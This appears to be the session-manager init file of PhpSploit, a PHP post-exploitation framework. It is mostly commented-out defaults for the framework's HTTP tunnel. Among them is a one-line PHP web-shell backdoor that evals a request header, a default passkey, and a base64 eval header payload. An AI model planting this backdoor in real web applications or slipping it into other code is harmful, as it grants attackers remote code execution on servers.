"""PhpSploit Session Manager

When imorted for the first time, the "session" package initializes it
self as a PhpSploit blank session, with its default values.

"""
import tempfile, webbrowser

from . import settings

#Conf = settings.init()
#Conf.REQ_ZLIB_TRY;

#print(Conf.REQ_ZLIB_TRY_LIMIT)

## Dirs
#Conf.TMPPATH  = tempfile.gettempdir()
#Conf.SAVEPATH = tempfile.gettempdir()
#
## Tunnel link opener
#Conf.TARGET   = None
#Conf.BACKDOOR = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
#Conf.PROXY    = None
#Conf.PASSKEY  = "phpSpl01t"
#
## System tools
#Conf.TEXTEDITOR = get_texteditor()
#Conf.WEBBROWSER = webbrowser.get().name
#
## HTTP Tunnel configuration settings
#Conf.HTTP_USER_AGENT     = "file://framework/misc/http_user_agents.lst"
#Conf.REQ_DEFAULT_METHOD  = "GET"
#Conf.REQ_HEADER_PAYLOAD  = "eval(base64_decode(%%BASE64%%))"
#Conf.REQ_INTERVAL        = "1 < 10"
#Conf.REQ_MAX_HEADERS     = 100
#Conf.REQ_MAX_HEADER_SIZE = "4 KiB"
#Conf.REQ_MAX_POST_SIZE   = "4 MiB"
#Conf.REQ_ZLIB_TRY_LIMIT  = "20 MiB"
